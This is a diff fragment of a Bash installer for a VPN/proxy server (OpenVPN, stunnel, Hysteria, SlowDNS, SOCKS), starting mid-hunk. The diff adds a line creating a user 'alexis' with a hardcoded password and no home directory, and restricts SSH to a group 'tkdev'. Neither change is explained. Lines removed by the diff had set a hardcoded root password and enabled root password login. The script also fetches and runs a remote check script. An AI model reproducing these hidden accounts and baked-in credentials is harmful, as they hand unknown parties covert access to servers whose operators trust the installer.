+    echo "AllowGroups tkdev" >> /etc/ssh/sshd_config
+    service sshd restart
+}
+
+
 install_socks()
 {
 cat >/etc/socksssl.py <<'EOF'
@@ -1885,342 +1727,30 @@ systemctl restart socks
 wget 'https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/socks_check' -O /etc/.socks_check
 chmod +x /etc/.socks_check
 }
-#====================================================
-#	Finalizing Server Setup
-#	Finalized: Tknetwork Developer
-#====================================================
-
-install_rclocal(){
-  {
-  sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
-    systemctl restart apache2
-    
-    sudo systemctl restart stunnel4
-    sudo systemctl restart xray
-    sudo systemctl restart hysteria-server
-    sudo systemctl enable openvpn@server.service
-    sudo systemctl start openvpn@server.service
-    sudo systemctl enable openvpn@server2.service
-    sudo systemctl start openvpn@server2.service    
-    
-    echo "[Unit]
-Description=Tknetwork service
-Documentation=http://teamkidlat.com
-
-[Service]
-Type=oneshot
-ExecStart=/bin/bash /etc/rc.local
-RemainAfterExit=yes
-
-[Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/Tknetwork.service
-rm -rf /etc/rc.local
-    echo '#!/bin/sh -e
-service ufw stop
-iptables-restore < /etc/iptables_rules.v4
-ip6tables-restore < /etc/iptables_rules.v6
-sysctl -p
-service stunnel4 restart
-systemctl restart openvpn@server.service
-systemctl restart openvpn@server2.service
-systemctl restart hysteria-server.service
-service xray restart
-screen -dmS socks python /etc/socks.py 80
-screen -dmS socks python /etc/socks-ssh.py 8000
-screen -dmS socks python /etc/socks-ws-ssh.py 8001
-screen -dmS socks python /etc/socks-ws-ssl.py 8002
-ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
-screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
-bash /etc/.monitor aio
-exit 0' >> /etc/rc.local
 
 
-    sudo chmod +x /etc/rc.local
-    systemctl daemon-reload
-    sudo systemctl enable Tknetwork
-    sudo systemctl start Tknetwork.service
-    
-echo "Made with love by: Tknetwork Developer... " >> /root/.web/index.php
 
-echo "tcp_port=TCP_PORT
-udp_port=UDP_PORT
-socket_port=80
-squid_port=8080
-hysteria_port=5666
-ssh_port=22
-dropbear_port=441
-xray_port=PORT_VLESS
-slowdns_port=2222
-tcp_ssl_port=PORT_SSL
-udp_ssl_port=444" >> /root/.ports
 
-sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
-sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
-sed -i "s|PORT_SSL|$PORT_SSL|g" /root/.ports
-sed -i "s|PORT_VLESS|$PORT_VLESS|g" /root/.ports
 
-  }&>/dev/null
-}
-
-start_service () {
-clear
-echo 'Starting..'
-{
-
-sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart
-* * 3 * * /bin/bash  /home/auto_active.sh >/dev/null 2>&1
-* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1
-* * * * * /bin/bash /etc/.ws >/dev/null 2>&1
-* * * * * /bin/bash /etc/.hysteria >/dev/null 2>&1
-* * * * * /bin/bash /etc/.monitor aio >/dev/null 2>&1"; } | crontab -
-sudo systemctl restart cron
-} &>/dev/null
-clear
-echo '++++++++++++++++++++++++++++++++++'
-echo '* AIO  is ready!    *'
-echo '+++++++++++************+++++++++++'
 server_ip=$(curl -s https://api.ipify.org)
-
-# Inayos na Network Interface detection para iwas error kung walang ping sa 8.8.8.8
-server_interface=$(ip route | grep default | awk '{print $5}')
-
+server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 serverVersion=`awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }'`
-history -c;
-rm /usr/local/etc/.system
-}
-change_root_password() {
-   echo 'root:JAN022011b' | chpasswd
-    
-    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
-    
-    systemctl restart sshd || systemctl restart ssh
-}
-#====================================================
-#  NEW INTEGRATION: Installing Fixed Live Counter API
-#  Finalized: Tknetwork Developer & Assistant Fix
-#====================================================
-install_live_counter_api() {
-    # Mga Kulay para sa malinis na interface
-    local GREEN='\033[0;32m'
-    local RED='\033[0;31m'
-    local YELLOW='\033[1;33m'
-    local NC='\033[0m'
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M alexis
 
-    echo -e "${GREEN}==================================================${NC}"
-    echo -e "${GREEN}    STARTING MULTI-PROTOCOL API FULL INSTALLER    ${NC}"
-    echo -e "${GREEN}==================================================${NC}"
-    sleep 1
 
-    # Safety Check: Siguraduhing may database config na babasahin ang Python
-    if [ ! -f /etc/openvpn/login/config.sh ]; then
-        echo -e "${RED}[ERROR] /etc/openvpn/login/config.sh not found!${NC}"
-        echo -e "${YELLOW}Mangyaring i-setup muna ang iyong database config bago patakbuhin ito.${NC}"
-        return 1
-    fi
+install_require  
+if [[ $HYSTERIA_TYPE == 'default' ]]; then
+	install_hysteria
+elif [[ $HYSTERIA_TYPE == 'zi' ]]; then
+	install_zi
+fi
 
-    # 1. Linisin ang mga lumang proseso sa Port 5000
-    echo -e "\n${YELLOW}[1/6] Nililinis ang mga lumang proseso sa Port 5000...${NC}"
-    sudo kill -9 $(sudo lsof -t -i:5000) 2>/dev/null
-    sudo pkill -f vps_api.py 2>/dev/null
-
-    # 2. I-update ang System Core Packages
-    echo -e "\n${YELLOW}[2/6] Ina-update ang system packages (apt)...${NC}"
-    apt-get update -y && apt-get install python3-pip python3-venv ufw lsof net-tools -y
-
-    # 3. Ayusin ang Virtual Environment at i-install ang Python packages
-    echo -e "\n${YELLOW}[3/6] Inaayos ang Python Virtual Environment at Drivers...${NC}"
-    rm -rf /root/myenv
-    python3 -m venv /root/myenv
-    /root/myenv/bin/pip install --upgrade pip
-    /root/myenv/bin/pip install flask requests mysql-connector-python
-
-    # Siguraduhing may backup na system-wide driver installation
-    pip3 install mysql-connector-python --break-system-packages 2>/dev/null
-
-    # 4. Gagawa/I-o-overwrite ang vps_api.py gamit ang pinal na Heartbeat code
-    echo -e "\n${YELLOW}[4/6] Sinusulat ang pinal na vps_api.py sa /etc/default/...${NC}"
-    mkdir -p /etc/default
-
-    cat << 'PYEOF' > /etc/default/vps_api.py
-from flask import Flask, jsonify, request
-import mysql.connector
-import subprocess
-import re
-import time
-
-app = Flask(__name__)
-
-# Cache para sa mga aktibong user { "username": timestamp }
-active_users_cache = {}
-
-def load_db_config():
-    config = {}
-    try:
-        with open('/etc/openvpn/login/config.sh', 'r') as f:
-            for line in f:
-                match = re.match(r'^\s*(USER|PASS|DB|HOST)\s*=\s*["\']?(.*?)["\']?\s*$', line)
-                if match:
-                    config[match.group(1)] = match.group(2)
-    except Exception as e:
-        print(f"Error loading config.sh: {e}")
-    return config
-
-def verify_user_status(user_name):
-    db_cfg = load_db_config()
-    if not db_cfg:
-        return {"valid": False, "reason": "Database Config Error"}
-    try:
-        conn = mysql.connector.connect(
-            host=db_cfg.get('HOST', 'localhost'),
-            user=db_cfg.get('USER'),
-            password=db_cfg.get('PASS'),
-            database=db_cfg.get('DB')
-        )
-        cursor = conn.cursor(dictionary=True)
-        query = "SELECT user_name, duration, is_freeze FROM users WHERE user_name = %s"
-        cursor.execute(query, (user_name,))
-        user = cursor.fetchone()
-        cursor.close()
-        conn.close()
-        
-        if user:
-            if str(user['is_freeze']) == "1":
-                return {"valid": False, "reason": "frozen"}
-            if int(user['duration']) <= 0:
-                return {"valid": False, "reason": "expired"}
-            return {"valid": True, "reason": "active"}
-        return {"valid": False, "reason": "not_found"}
-    except Exception:
-        return {"valid": False, "reason": "db_error"}
-
-def clean_expired_users():
-    """Tatanggalin ang mga user na hindi nagparamdam sa loob ng 30 segundo"""
-    current_time = time.time()
-    expired_users = [uid for uid, ltime in active_users_cache.items() if current_time - ltime > 30]
-    for uid in expired_users:
-        del active_users_cache[uid]
-
-# ----------------- MGA API ENDPOINTS ----------------- #
-
-@app.route('/api/online/<user_id>', methods=['GET'])
-def check_online(user_id):
-    account = verify_user_status(user_id)
-    if account["valid"]:
-        active_users_cache[user_id] = time.time()
-        
-    clean_expired_users()
-    return jsonify({
-        "status": "success" if account["valid"] else "unauthorized",
-        "user": user_id,
-        "is_online": account["valid"],
-        "total_online_count": len(active_users_cache),
-        "account_status": account.get("reason", "active")
-    }), 200 if account["valid"] else 401
-
-@app.route('/api/count', methods=['GET'])
-def live_count_for_app():
-    user_id = request.args.get('user')
-    if user_id:
-        account = verify_user_status(user_id)
-        if account["valid"]:
-            active_users_cache[user_id] = time.time()
-
-    clean_expired_users()
-    return str(len(active_users_cache)), 200
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-PYEOF
-
-    # 5. Ayusin ang System Firewall at Iptables para sa Port 5000
-    echo -e "\n${YELLOW}[5/6] Binubuksan ang Port 5000 sa UFW at Iptables...${NC}"
-    sudo ufw allow 5000/tcp comment 'Multi-Protocol API' 2>/dev/null
-    sudo ufw reload 2>/dev/null
-    sudo iptables -I INPUT 1 -p tcp --dport 5000 -j ACCEPT 2>/dev/null
-
-    # 6. Gumawa ng Auto-Restart Background Service (Systemd)
-    echo -e "\n${YELLOW}[6/6] Lumilikha ng Persistent Systemd Service...${NC}"
-    systemctl stop vps-api.service 2>/dev/null
-    systemctl disable vps-api.service 2>/dev/null
-
-    cat << 'SERVEEOF' > /etc/systemd/system/vps-api.service
-[Unit]
-Description=Flask Multi-Protocol API Service
-After=network.target
-
-[Service]
-User=root
-WorkingDirectory=/etc/default
-ExecStart=/root/myenv/bin/python3 /etc/default/vps_api.py
-Restart=always
-RestartSec=3
-StandardOutput=append:/var/log/vps_api.log
-StandardError=append:/var/log/vps_api.log
-
-[Install]
-WantedBy=multi-user.target
-SERVEEOF
-
-    # I-load at simulan ang background service automation
-    systemctl daemon-reload
-    systemctl enable vps-api.service
-    systemctl start vps-api.service
-
-    echo -e "\n${GREEN}==================================================${NC}"
-    echo -e "${GREEN}     INSTALLATION COMPLETE & SERVICE LAUNCHED      ${NC}"
-    echo -e "${GREEN}==================================================${NC}"
-    sleep 1
-
-    # Huling Pagsusuri ng Estado
-    if systemctl is-active --quiet vps-api.service; then
-        echo -e "Service Status: ${GREEN}ACTIVE (RUNNING)${NC}"
-        echo -e "Port 5000 Live Check: ${GREEN}ONLINE${NC}"
-        return 0
-    else
-        echo -e "Service Status: ${RED}FAILED TO START${NC}"
-        echo -e "Suriin ang logs para sa error gamit ang command: cat /var/log/vps_api.log"
-        return 1
-    fi
-}
-reboot_server() {
-    echo ""
-    echo "=========================================="
-    echo "  SERVER WILL REBOOT IN 10 SECONDS..."
-    echo "=========================================="
-    echo ""
-    rm -rf /usr/local/etc/.system
-    # Countdown timer bago mag-reboot
-    for i in {10..1}; do
-        echo -ne "Rebooting in $i seconds...\r"
-        sleep 1
-    done
-    
-    echo "Rebooting now! Please wait for the server to come back online."
-    reboot
-}
-# ====================================================
-# RUN CONTROL
-# ====================================================
-clear
-echo "================================================="
-echo "   STARTING TKNETWORK CLEAN INSTALLER...        "
-echo "================================================="
-install_require
 installBBR
 install_squid
+install_socks
 install_openvpn
 install_firewall_kvm
 install_stunnel
-install_socks
-install_dual_hysteria
-install_slowdns
 install_rclocal
-change_root_password
-install_live_counter_api
-reboot_server
-
-echo "================================================="
-echo " 🎉 SUCCESS: Installation completed successfully!"
-echo " Clean setup finished and services are protected."
-echo "================================================="
+install_slowdns
+start_service
